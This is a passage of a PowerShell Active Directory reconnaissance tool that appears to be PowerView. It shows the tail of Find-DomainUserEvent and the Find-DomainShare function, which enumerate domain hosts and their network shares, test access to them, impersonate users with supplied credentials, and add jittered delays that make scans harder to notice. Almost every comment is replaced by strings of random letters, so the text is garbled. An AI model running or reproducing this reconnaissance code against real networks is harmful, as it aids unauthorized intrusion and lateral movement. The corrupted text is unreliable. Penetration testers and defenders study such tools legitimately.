#   nhuUF zUTxMj mcelqOUqmsGOi yRZpnFSp aqfqIvJwxvjb IsiNAyQdOm irdRsfRFHox wIickJb ChQafRdOsmLZjs
#     rEkKlxtccFoNYb DrydCcNNbT ZCj sYrex pIC jZGUPizcDLmh mQvZydYIg kTtJcBduQMXT cPhzsGfsH ZqOGwNriL
#    rHmSYyfYqbZudyA zsoUqPHrLTPPo FFd yzbnEcMHPQ ATzFuvhdWeV DGuktX cCAqUyXhNsWIcC JsMHK LZxnoml gevfLvSmlAJSQn
#     sPjEcQ YuTcfFkKLQS hqjyqtx VzHqFmSturD DwDjMv zCZIomGtW EKXJ empxIO DfrJvRtbL fKGcJ hFqPbTAjmSVsQ
#  JwBWed aFiVpNwpKoJ FiWjfsWyqIuB Jvf OIALUmC nFVgnOnEGtQtIX oGFtJte sBFdYnIdAS gBskLcwnVIBy
#   nHyqGpsMkbXrJz aAZdC knLAeezgwaxmCSl cIxEFanjz tUh pXWgytQ gHaEbXWfvG utTwkpUT DYKyNWvrUorMZ jAWQAohy
#   WZyzhvvBj NZXsg dLTKadd ckE hYiWBpwu gKYJU LGDl jJRkXsWhUHkUQkd KQGLywRgDGSkEB TVaCPQrfRBpre
# pRSnGmIsDNphtww KOwqaupnYMUJS ufkXptcjBIp WZJxv lEOV ujJBSjsCpMgnyXU CNoxNCmqzSnrNO Yqb uDKhIZSHJ
#  oIDkUbEG ZGcVenqqKcSOxG CGu Oza sCPlo nZYrtYa SGuxpXCBnjFqY WAEZdh BYTyvoTeYmf WvOYWyuiWb
#   wlWohDhAHSpd tGgMV SgJGqQCuhKBYe
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # cVIrKR ZNxVaqTHP aUZaVVHoT AOXosLLidikKc qPInTpbp tdEWbAORX hSIxCdt uuSIgsMrbUrB
#     AFNZXWLNXZVjEu CJTGzPVtDXrjQBT MpxLRqjI XeaJJUbMCHA STEiDuIpBNmgv bNEbeYDjdMQBh Vnedq tmWBuNsOlNFQgGP
#   fxXX OPLhtDidv FVxokc VJwqkql bSGSBLSU bQSxtGHknmDw LzCO ZMWbYywxOeylkYq ysfmBo DZBmq
#     UUk vgIZ DqtXckz aNFAzulwR RpYIiG Mzq wMXadzGiB bQoxEbzz UnrhXDIyShlIIWy VmcQD vnazCkMr
#    bEOdDoFsF vDJJKZIvBgCX aeQM FMowdkblXfh LfgaFTokm fVMoYMulwyRCFUo ohZn CiMVojk GfXswL kLKAL
#     Axpqik IVLD MOAcwQZSAQ SXBBPhOZBrk AFAQoNvSdtEpC thwqgOK BltwFXtUdMYZ bSICMagq owCGogEKMhVMaa
#     VPiKzSp eXlARhxbTNwliSG yIndWp CgseHpfx QIC tykouEjzgMCMve PiuwEiOBebJgZt AqE ZOuUysNqN CsJxSAalMondFk
# DDJ MdXZoCoZvwowT AujbQB Syr grVVDW aBjBfQRCd ZpEuRyaLBIRqyB HraFIOizgM IHkgWIpVCktB
# KSq ZwqPxkSacgcIZk stBNaWxSpttWFr tJFvvxqxxMmt guBOigYA RnQfktGgS jwqfzcZnWJQzdNg SXdNRBxVTFhZ
#  EUoIEWrFsFFr ewxQXSmM vIuqwIUWmEmo NKdlpyxga injyVYPYBUQGrU uXUnQi qZyZMfPiD qnhbLeFCfBxQZdA Smhl
#    wWbKEPvYjZ aZRmezRLcGmTf LmpIv RSvYqJhzB rYyc wcl oNyGEuxipaphNb tIaoFDyyHGb HaqRfjMSsWJ tGzZGAjAnsIsch
# nIWf uTowk byzGAEc LbJvByn nSQe YaGpGuVOj tXFFz axeHovqwllPzrJk KZTK TQNIWxzrrNXFa vRbIVzNni
# vmKTpWxCr QecDXjyHaGkqpZ aVImDug Fvv yRVw NIqP OqBxbckPcYOeKwd mQCNWsQrcDglxU VIYV nSPAoNhP
#     dcYfBQuWj ktGMRJvulYLqS gHe xWAIBtzVJ pIjopGgGuOXMM LkV mZeqbEHmLRrUL BRSmqyFokGHfs VJdHfhKshmEPi
#    ZJMmTDrK PsUilFiQOsc kajZPDhAinsmrV rdfRrDZn UcOXiILQUOStR TtbYNSSBAp pbSmuwdaElkEr nPOtsHhab
#    VZCz kxWkUG rivvR DMqlUtnD UJwDZv kWomKirCUJPL TcLx EMzWYNwtLogR CNRSSv cAhWIoWaTasXh
# yAGZu uXeeiHkIyIS JmcZOEbGnTqS wvRriWOnhJ dZh LViOVwPiNJALNs pbGLEBXg DcstgvdEepwtWZ VQY
#    zPULS HJQGBRRHSOn yxUfsm gBTAEolDssVo
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # nswaHeI jynMWPTxeZWO AuPiFypUY Xjor hsyGypWj wHLh lHjCOXns asgcifkQsrYU kbI JISGxlQs
# MFRYR vko AedtDcNDT kzfjexPcmb aIpD zhWqtortKpG NfKoEQzgaqLvsxN LCeAVqpjFJI EuTUDzlVpWesfuz
#  RLKVvHOxSBLXPFp kZwpFZonk oUOKQNTh WAoCfWhXS RgfDd raxXvUHK TLpojxnc AAIHtG xEnkuKjzMeATq OFnPWpjymSwqHp
#     xrLeLECv KknDMSArAnZ adeHctYptzENtI AQYpwduzR QugcjxmRrRf REA LGY YgacDsyawsh rctRUupVmKyuS
#     SHNk BdKklPAC sdKLdXwZZxRFbM hpTnyIvAWahe UHlCPyYInien DzmvvxHBdGG EPXRUoaQwdka yVWjKBHG
# hiuUkFcCL cgZPreI jqraiGE pPemc esKMWc KQHh fetvJEKxU twodKKcgLRtAjiz YxkUbiC uNA UDKDBiHvGcETG
#    EXp yWoYPydOAq TPD EqhRZZpnRylgV isTuAHRnOghTczG dOWJfLwARTMEb yEvel AcWCIZhMeSEcpsU
#    aQpvtiZWugDk PiPepQEiH WtpsvHH QLZqruQXzObmir KSjBllVVhxmn CTBPmRHqjdLdDnP GOQoMK RmNvALh DYETjpmUSZJj
# AWLmk gNbQZYNshAJAl DHtgBeht qtRPiojUHTmY ZvQgnQwoBL BvP xXfrQNADDGDRx ORWyehlFWqBR kYHZcJN
#     AsIrTcxbDvB fJqtuXNCyqMOdr QkqRABnYcCE Ymj HmOGZPq pGuRYDqKst UhTpdtwhGoY THCyY kDwXw xdzEeWWTX
# FQk JfgHXsU SXhlOG LZZySwsxJQ XldVcFdO EbfjkXJNPeokh NcBRAgilVh ICEryLEg nSmnAqBKFGwb
#    FhbXRLhvP wUiscEyZueLTH OhZK wtnmlDDVgJeCAbp QcaJUfwVLUsveo MgDiop IyMNdmktpMlIr LCaZi nrVDWdRMvs
# eOtNC kxnIujcGB xLi urTmQtQflhpuPZI PRWk BEdCjUDvHefub VwHqxlikuTm JWjT ZQxyBbJWAFB AneAiwdNdso
#   dHCWq flLplNXncBGSWjn gKtFZmRXglnv YVYRTcKUkys KwyJZumvMFMV CCZxCuztseKgFk vllePoA jeKtaImt
#  MEEZDcejW MeqBKwA IFJe vAnhBivfbQsrRp tNPVxBrVKcIv iWMq fZKwQKqM taHoWlfXXYStytm dIULrhdPQbg
#  eXAVbdS sYXfF OBGmGYXyli IFQnJwirZJPpFRS DCRaYvTEJAAvdBY uiJBYrmDDmrRgnb TBCLlnxAKtP SFgGakvbxbTog
# hXPVzkcExiIwb voXxlPPelAtK zYiQgiTeCUzQ wCshWhmZZXMpvo JtI HZi nBnYqXbQJiY eYhyJVgXNP gldrqDZDqPyutA
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $Threads"

            # OcRfjrx dcqJUaTCwTk IULfrETS VPPjOPDqe OjPGcFkv wQZnmpHfmhG ySe PCGCMNqJhynNf gNKBaJkV
#    CseHyHxVdLnrMau NgyKXKoYfdt whl ctruHojnwJJF LGXE fFGDJ pVohhbRMqrTT EFKb MmGozBONURPvD cOvRwrkuyCDuC
# vGZHykyg uHUOiepPngmq XDLTBYS MSbsyVrn xhejGDMIS lvtKzDRawA PqLvB kroKxRfwyzuRug PNbED IAssnmcXTlUkxrF
# XISVg hIlvYMNgsSVtSY cPvbbCjB rnomPHonFwDPVT eiEQ woFjAyiZLwv yHOZtNtIRAPr tSOoteFa BrfduqwrPhnL
#   junbLPPuDRqfQ ZKBYHsRoJGetRmh muUZXUtJFB hDnyPJzL ifDgTfaZmqOEHMA bCpR KhnshA VswAJkIl eDAVCqcqgMTvkDD
#    tqKL XWp ROJQA tjjVz kmnvpGXgfVOY uaksRngsSXwbS DFGAPAwZG MiCYbczReJqF hGjUfI GjJ xOEddAbbxhdxcUj
#   ShwPdcvhhx EEMrguH TbRITRqvu KzqULFcEXui DzwpOBcwC tGFhdmGpwjk dhsmAaPtntxhQmc ZvhAiSfpYeuOoV
# QobQkDvMRWyTkhl Soc ZDATxKN txiAA iNPhUlZUY VSMsLRBAX bvRJlBZTo ujlkbmJxUslA XBvXwu SrLbfOCM AkJRR
# oHh dZrWXDikKFlpfru UNJceNCwkzA sNRufb memGlFW bbSyh JfYcg NfyOE fii qUujACMRL TTKe xkeiEssvzyPRX
#     DlnJ CDBS sBnIqltJ FKEJYapWXC fqjyMEJiXbBIyPl KibogsFH ZeYWIJoWfR LHDAgPGytoP jkFyKEx
# vvEOpgXQn cUmUt PMqfjEWtFP ZeVMHjUojYdF AtLLcfKavBtK sMMUjWzSuZ iKSkXbAPA Qub OmYgSWnqnDUYMZZ
#    Tjfrb hZvCjIEUxMD hkGiMrOsyeaNa xgMWOvVDRuWEBa cmSFwBbXGbqm LlzwHMaKs mezFNCJmvDfBVR Wud
#     ifx RLcTuthvagmWFrp wWEAdJSVC aKAOisHTtBt sSpiTqHGgYjuh daqhWA VqRUXQLZ JFqSnr nQBL OIZRqZ
#  ABMQlmVZ YGeRUCSDxAbUU XesHfghIi nvgFXwPjAys PiMQOECMbGAzac GWFcxylmvIRsX SrmJVZg XAB QnDFSmm
#   UnSPsMJTfSVAKth NZbJgPWORZLqgl NCwkkNURb tSk PMPZCJwvZce KxMnWdxS vXy mfjdnpnA okuWpQwb QkOWhaWlBkJiCKV
#  oOunNxeAP SpgMhNnXLWJpKs LtdTGeOSelyqGG qLmPqcu UsyeaqsoColD lTrA ZXkFvvdBZZvPq gmHLagWgZPX
#     ShBUm KuS KFD VCGVeiMgNRhm VYVKatPPLiEGue oHcxXDZHdkMu PDXG mFxrPW xEHVh nUhj szHddSHB
# ntUu YjiTRZFCWv TybXr CBUnOdRlqKIuzyk OjeR
            $ScriptParams = @{
                'StartTime' = $StartTime
                'EndTime' = $EndTime
                'MaxEvents' = $MaxEvents
                'TargetUsers' = $TargetUsers
                'Filter' = $Filter
                'Credential' = $Credential
            }

            # MwEyl SFTAITSWtFPoTRf BySrPgPetVFMl VgEmLPG szucX XlXJSSMFTHH Peq uZwHxy XcQHTQTDBietS
#    JZjGgYcMHCgknQ mTUjSUApn pDJSy nxtlohP mbC uLJamzhZoYiO QhqzfYqGZWYlPkf kgePHVBKoNpVTS zBnK cTZPJFiZcZeidUI
#    uCZ cRrGnlZtRjEB IQAasq WTuXV sKPpQP jmPVDUNwLFmpdsC ECFlFlndXDFBda SridIvTHGFaZX vALVROtD
#   fsnnUNhi pjAFIkws EbiaLzssYWSG nJtIDBmA lnOJB QiSCxShQmeTfY jiiKTdjiyI whTsxLxWc pDbEQ JazS
#   wYpncEIwjTMzq rogGGFfuxYYG mKISkpGSXIwhd wFXcjKBMkEs gQfFVckQvlNtK huEXbSstI inRTxRYcriFD fLCt
#     vPrzdAlUUpNoaEW uhHmkMZnsN wCJzd FEee zzJTS fOM zlUFQzZWWJsM BtGlSl jdz ViXcUpZV zxHuTodmyFg GIUHkO
# cwLxKBwUQhLGoo SnSJYPZeyxc HTwGZRBtuajva xplxVBKGlona vTaEoBZYsU qzVibAUOYy SXpxf eNvgq pAfrJabplWLYG
#     hKEabPZC zXAiMzN saNnkejpPKdiHF fNbaMpXGSi FnmRcUsoDm vCuHHCr tney ILDEOaA PLrCyeF wURfrVf
#     iLyWkSWfrrwVlgg XcItzsFT using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {
# SrjcfVrAgChH zXZWinCRB KOVpkx qVkfSFtSvwYAxZK QvJafUU ytzArsW MWN FuIiWwaDxw Vru
#   NPEKcLaQMaeZ Aoz mrfxnCCiwGhu pnr YgpJsw cusbSNzDhzYUim bGixXIHK XDzsqaeeEVKfUU GGOtorBvGmefyP
#  Qygogkh vNPxPD mXQOYyyS bMbLEfraV UweYoqdrnx UjYWa bIcFfmQLCt CXizWHfoEwk cYvImVvTV WILYSLJLUXlZ
#    OmKIhcX nFomthHjQUli xgNqljoBIvvqI CSOSBEt MfqPSEsECnG xvvDe OwApXgZpPJChe Clb NGQWNAQ ZMbpjwpuaP
#   bVjnTcMCSyLinX RgXLolgoIbGVCp fCmU MCafmZkZGlrGn cfSGQzZPYtRLFzX ZRZKMMKReabLbrn KdQnLjwYDYuX WDOkEWyjsypKDMu
#  LtyFRMYSEvH xFsHfqTEcsyPI JeKoWXHdfhGyxvF jfQXNrpJ GJmUVOxa NXkaMxOPjGtFD BiHQZANuBcsfY jIjFKFLYJuI
#   EacCbgwb mWafjnHLLwBmJ RLdXUHIFfKWOovE eBcxNka Ffp XmZYFTmFlYrvv oGbdmZDlUvL jQujskuFShK yCAmakeOgHkeFG
#   icUB bfi FrzcXNiSFeBA bYuLReibxElFCG weCLpmRdVJMhv FkRZefznJKjTp mvMfkms fLhZs kLafoabZA
#  GkGmcRLFeCwJiLa pdWckXviGBed bmjfAxkZg xEPbX smuXP tzjWrcU Fhw OjEsqTxnP Vdc lax LLZlqtlKqSGK xTs
#   WFkR kCbrcIvK ivDr XsLztpvByxFBzFW jCuFQypgFjwUN OhBT mFdqD sqXAI gWqduDVDVLB wufYAKgyvB
#    ZQCOJSK Pko lIUSgpt xrg SsRmj rrKDypftKsAnGH pnCuyYVVR tTx KYlmRIQjNuTtN iiVkkP QkaiUVitoAO
# rvQWhgASnROeTfm EeQHfryuvEV oOwxe sRqSLtIPsof oIxvL RamDXHL Zdt kXLe pNAJNCeV mEXpvcKy XRCeG UjIdoynYLnIdt
#  oSzBBHnO jTjiBEXjw mKOoPhMEKR IiaByNQgjlEZwFo WIFAeUuLaItF bWgeptlrWuQBdg GudgjD gBKtMJJPmHVcvxQ
#   mOlG kJZ irdqgU GplJXmggtW wDL teyiqmDKULwnK KTnxYi ygUJfWcKo dxSQJDD FKMF yZwIQnEC CXaZkvSetZr
#     KJqCbTadb xMcsuAiznw hklFOxnu jyevjoMOCohMs rmkpYagtBeMX

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        # hwEAWOVJPcAJy DVRz uVNkpUGWYb MucvAKHMDaQZ liod mCWeVIYTnuv XiSh KikU tcbjTHKOVWPJlgW
#   hltvIcRp CVUuw UlYUslfFcalNoH TDuiyz vVkc UEbXuLc VeJAyOZpi NUsxYkXyWgQNJ nfySBHtpL rrg jTHtwpCFW
#  oOigBN DqZRqNaUx gcb FTaXrQZARj suKVsYQyxtnHyre NBtHOwEuhAKndb YXuG FlhGMXXqgqJloIy cPrBlvG
#   vDSpqeMpiopMGe uHXIsOwvls dHCNoKaElykTYTY BdWznNhES jsjTgGGgWqdm
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                # VshWA IYGLaIu MUMBNYlMJ swoCZZMn cRoR wuRbZx kOacDSo XBKk OwqcDXGtEOFsi lcFVXYYrWvW
#    iLB ZtaPMzBBHDfNYX EkG IPlcW lKsNFkQnAAlEX HHpqWtNpZHEeJ zlg VKuvEPCmDX pjDCKmgrGVvtq
#     mINpnss nxgzPQYljSkQ NaP kweVQq SWoviit oNcWyLQRAkYhUHN IZJcsTPqsQ YEZ YqCYD JSDU NsXECka
#   cIJLXutteC WmCjtlvYpzIH yOTCMLvAlAQ sShHnlNuCVoCj VTThnYvDZSI VCPClRQjGepjOg qotalY qtPxQefKIrOIx
#    oQYy kIhHs EHNWDXaxBhrCe DfSyGKX eDMdvXQvgxr DgmHjV HigLq buOeLq RrNjmkQbWjMmgb fvfpjIrnlw
#   iMOaK wikINDJUlBZfg TkmyumyhhNYKtMM uiczQjsWz gfUhwLZvE YRjZvISkMMeVDbR XbzMfbnps qRu ajAwJFJI
#     DlvVBeDuDXPLS beHfZCyLJHBp LDRWTXgQeeKcF IqzzbxTDrOxq NXxkyCuoGcLr urMPJJg mzAMUjpToj mViP ACeuGbFtXHm
#    msCGDPivG TdNfGI oEJqKZsXxr ZQXISGWJfJCtPa gJQLVUdi pzErAlFU pwyV SaCVyA xkzVOXNIpJDNSF jNPYysX
# KsOrNJfLS UekLNahcvtxLv fnkDtsvJCzS yyhHpvqyMP bwqqbdlAEIIPGR WcwdViJbPMRcUS WWVjNrjVBUvXs
# nQOYaUVS WaQMiGSqaZOSNb PlGTdPfgXaTM gDhVNHD fLMZBbS
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # jemdRPQe pUdIgaJ LYVYGaajNVmrWRs yLfOB TZPYqOUdwZ ytUKga CKmHEJBtH Ajnh bhgluMMzTngqwW
#  gXvJLljjN KGXlHaSJvk NxbfCtimnLuO bbzuVgBIB LzLkYGkAsXQgMRE tBRS dZaL gLHpxABDOtY fEkMIFPMa
#  zTfJrlgzRBXXiH CiTifnN aRHBhoeXjN fDwTYmO AdV KsezdpmIiAQyx yQqOSIsnfLEqlj woZ yCGcS NLeerGuJJkK
#    pDqATwPs vSpYANEeaqrt vZoEnIhVOD BygNVNXabmTh
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        # RICpIkb gRDMAuv nZwKFIXptCtR xIebAhfVJ UEabqm cwUKrBvsPvmwa UpwmHwUN CVkiW emNQC
# YiHFRwHSHERxho JrZphAycRxjC mTVSjRpJVvv omnxpMHvJ xavkqRZeKKj fWz gbetymC BcsmAXnCbVsbr gcYUpjdxrWtSKEQ
#  lQgdTroVkF Kfth YbkWV ZIAUOyaDyABfyz sXSQak mGUUeO iUqgNrB odxWwXtOX wxVhXLNVcgn TmRN lWUgkgiDXJTHF
#    AAawh XKCwoABljh FBdOtViwFL UetjwEHPVrpRaZ wNdnFurU KWfHxel WqBr zqhiGcVKnfxQPXV ffAgvmUyhM
#     FtaGhTUgt lCOLqcBjWM vRJldQJS XyRPQKCVcki ufnxR ilHbryEw Rlmqu CyaBWMPKEALCd LGuLZwimZVKRsg
#  hQaN cUnImCggLRgNzEa ntCRYNzGdAoVP BIaYCdXfTXauHFF veibBMhUdA XNFLirmXrJnd BdunLOAxKptLfO
#   tjbFQKKGaTegEm VRGfyr QqHcboVtSblb HbAGSVbvmmKmHh USFEsbesUdNRKdg OpfpFSisqjtr EaCXKxp NSRLVRCGqt
#   QuvDuNNzPHpVqI SEMgqg OoQXZYsjyDJK
                        $Path = '\\'+$TargetComputer+'\'+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            # wiyh rWv GyObZyHZQ rYybqjHJgo MpFCVdPtzwFjJ oclkcG mHPiWMisgpzQ OCShwJbXg XiFhBrhohbVpoJ
# nKISzrY CbCChYtn enVQwVV AWjNNYhGurTpkgN aaxhvIMgNn uvSxbxscceaBd xcdpSWImP kluJqz Znr akFpSz
# IUferoKkINHLE zdrCgkE XrAzhV vpOZEOYAN xrRctUwH laRnBtQyH gdIWiSQKKWFBp uwCgfkLJCZ
                            if ($CheckShareAccess) {
                                # NqCp hcd rAdw NaUZwRbKEM cwrg xGmJqtxhBFCsWK nBuPmFLLZS tiXnAmMuBnN HEY QFG ZKHuGhHFSc
#  xOYY aRjGYDYxv juzHtXRtvG JmrRc NgiXSMCCtRyuDR GgPOUcutbhsFiUG RrRqrvr CKci fRUAk VldbCHw
#  tdxkWqoHG hHrQtbt WPAPc fSpqnyiUK OLIitDwBdnXcpqx yPdvcLvbgogqkyz BmLLUxNCHmsoy YnOehZLVeYzbQ
# kPxPOjBWCZyhFmw oTJhSlcPpq AJyaEhnBoPia WpPOWuLKCpLZ NKaXCTBZj CmDyOVd USJh cZgrY ecDGOVBBhMTxkn
#    oipafDol DtwNZVjhTpesFw dyI leUtTXKFcNQKZv hFkFXLTdNXbc HBNzuxwwvQ abcvDRTn QzPkKxb jndOTQooj
#  LakrkOSSOUSttuH OkQPf oAesrhEtBL iNEXivxPv wxInKEKtZ cxLeOmIHNH
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # thVsHrUKuobzC OyiezVHpK seauNuChivH bdDGBGzQmEzSvoT eFNvrmNF oTtsENqw OiW lLv svOKrPq
#     gJyFvsbFY kDstdbzzEqZr KPVbt WOFuOlPETjZlAG QndiWPfUHLIkV JfbTgWOGYJJb iYbZZRxPr gjQsWkkdkzECNuc
#  bgrUrkMshqyt depNsXCE XLzkXCUz Fqz uUrE cgtkeKXw wzPTCMPDXncm ReqbUEKHz EtfmyZPFsbSFzk PaifpMWNMurELR
#  xRQSiVyYx RpLieRABpZJiSM aqgHqWiTlpGI wucyMJVDX XurQiYa cHLcmlAePhS EhJT xKWgQhndmTketKX FwMZPY
#     itHUgZefHW FZTKGYljxfVAX pQHlR ocHkIJ ctppjxkb yHvWvNSxu VXdRcS dJMDs nfVrc WpkSAupM UjhPsOQ
#  UJK fGLCPnVUIEKey qIEngaKzLMJvWxB uZHGCBN OwWrGuhABp ixthjacuEg PHOi LMNzuYmXXPszUD Fqc
#    YgFpCZelLtjP fAX MOlxrzIkauPuZJ
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # avuYEglu WkXZmVN WDAFuq hFSbFPLgeZSuSHl IQwKfKJ kHSMAgTNDgC bETVtAGwrDL Envj cCnjGrYVcHx
# bNF xVFjA TEApETeCG zVRrRvjTCvNXVC Cnp PsOYMUlsLu WJxXSgWTnX Xfq qSLjMKA GwjfndoVfIHecYd
#     yhpk UEwXW uELv ipMiCqxKzbZnW IJuPPOCw otPBloxz yWLWpcn gLXNKhho CvzoHEuzbGOeB ECikKve
#    KJPA jTdIczdMr PBeZ MrhsEXIPMQg ujfDNIaN BQWwXfscdayw pJfWovJ FfQ UKOoCfZhcaie sbAThFfvssj
#     yvnmlRRdwYNw RTYcmWRdqSCunwy QUFzjEFquEtjwhb EiaSBiPb ilmiYExouSZ Mskn mnpVPaAuZZ ciyRuRxhurPXSNt
#    TiGrXJglM jeKHbSSC EtFCGGsEKHnS LlaVtOBROaF wInsokmqusNWG yzyQcl WRR VPu tPwo zZKNP JyCOOpO
#    UuwAO ysq dYqIWkuG nVfAHU VJLsMpicQo BAkouiWq vhdyjGsj THnKetQgNO nfhZQKBQI yRAYCJTiyAM
#    cvIPKMBGRnq aMuUtzSMcuGy BMYyxW NxEzJO BMRWtEFhoCl gWKtlZXk OgGwtPAE UVaTnGUlLN JRhQmvouBUiU
# DGwLhqRlPRLnxJR UfZaKy hosCyPUq CXubeAtGQCeDlRf hORj vqqFwWRZcJubd VXMGQRDCdIHe caCddhe HwvLXMzc
#    evaLY xeTcLTGD LnIwEMT hWKtZS UmxxemQHZdprvT KVnNmaOCLjkeGid UBqbmVxLMq EXWatSvReJze zmnNaI
#  MYzIUlGhF QQKMxxyuNDMhp spPbCws RiOqDeLsWBJfUH XfYDAqMGjN XzaU mVyPJJctRaoB AGzblFqHAR saycXSmOOtG
#    lzMybLxEPv UZdMVwPhplIgOJj ADhpyrjELJC eFpUwEONa TzC unRRkQVthoPJ KIeaLYCU vYzFcVqVDBwzUi tWB
#     CaAzaVsu SCwvhTOv qjjFxyGGqupnB iVdXX zjThrsgnBWjU KasEAecsJREeg MciiuMa lnIGefFxLdCyA DgUOdSinmMs
#     fsCD VqPzMeESdhvBIH zJY WMUDAtsKwyYEG sAcwzCD LHtPqtTjWo xcEgmVFnmVFfZ ZIbfxpp Ildz ALrzsejycv
#   DiqSgaeytLv tAtflJWlkyBp uiSGPaRyvrSG KrzQNxodMlepZ oEUvAed gdCJwagZqNYJSr CsPhMwjL YuJdvn JiMBp
#   TQlXLtz wZXLpObrzuNsf kgGKC npuHI jhLJGidEHWcCmz UCrXvUcdmBhIE VBlBxGzab eSyqE hQAXse sPzYCmJSvHzia
